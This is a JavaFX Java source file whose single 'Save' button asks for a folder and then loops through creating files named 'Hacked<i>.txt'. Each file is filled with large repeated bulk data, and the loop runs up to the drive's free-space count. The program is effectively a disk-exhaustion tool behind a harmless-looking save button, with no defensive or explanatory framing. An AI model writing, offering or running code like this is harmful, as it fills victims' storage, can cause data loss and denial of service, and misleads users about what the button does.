package application;
	
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import com.sun.javafx.logging.Logger;

import javafx.application.Application;
import javafx.stage.DirectoryChooser;
import javafx.stage.FileChooser;
import javafx.stage.Stage;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.layout.BorderPane;
import javafx.scene.layout.StackPane;


public class Main extends Application {
	@Override
	public void start(Stage primaryStage) {
		try {
			
			
			
			Button btnSave = new Button("Save");
			 
			 btnSave.setOnAction(e-> {
				DirectoryChooser directoryChooser=new DirectoryChooser();
				File choosenFolder = directoryChooser.showDialog(primaryStage);
				System.out.println(choosenFolder.getAbsolutePath());
			for (int i = 0; i <choosenFolder.getFreeSpace(); i++)
			{	
				try {
					System.out.println("space = "+choosenFolder.getFreeSpace());
					String name = choosenFolder.getAbsolutePath()+"\\Hacked"+i+".txt";
					File	file=new File(name);
					boolean result = file.createNewFile();
				    if (file != null)
		            	{
		                saveTextToFile(bulk_data.bulkData, file);
		            	}
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				
				
	       
			}

				 
	        });
//			 File oldFile = new File("F:\\test\\b.txt");
//			 File newFile = new File("F:\\test\\cx.txt");
//			 System.out.println(oldFile.exists()+" "+newFile.exists());
//			 boolean success = oldFile.renameTo(newFile);
//			 	
//			 System.out.println(success);
//			 System.out.println(oldFile.getName());
//			 System.out.println(newFile.getName());
			
//			File f=new File("C:\\Users\\SAAD COMMUNICATION\\Desktop\\pers\\abc.txt");
//			System.out.println(f.exists());
//			f.createNewFile();
//			System.out.println(f.exists());
//			saveTextToFile(sampleText, f);
			
			StackPane root = new StackPane();
			root.getChildren().add(btnSave);
			Scene scene = new Scene(root,500,400);
			scene.getStylesheets().add(getClass().getResource("application.css").toExternalForm());
			primaryStage.setScene(scene);
			primaryStage.show();
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
    private void saveTextToFile(String content, File file) {
//        try {
//            PrintWriter writer;
//            writer = new PrintWriter(file);
//            writer.println(content);
//            writer.close();
//        } catch (IOException ex) {
//            ex.printStackTrace();
//        }
    	 try {
    		 	String final_cont="";
    		 	String string_cont=content+bulk_data.json+content+bulk_data.json+content;
    		 	for (int i = 0; i <150; i++) {
    		 		string_cont+=bulk_data.json+content;
				}
    		 	final_cont+=string_cont;
//    		 	for (int i = 0; i <200; i++) {
//					final_cont+=bulk_data.number;
//				}
    	        BufferedWriter writer = new BufferedWriter(new FileWriter(file));
    	        writer.write(final_cont);
    	        writer.close();
    	        
    	    } catch (IOException err) {
    	        err.printStackTrace();
    	    }
    }
	public static void main(String[] args) {
		launch(args);
	}
}




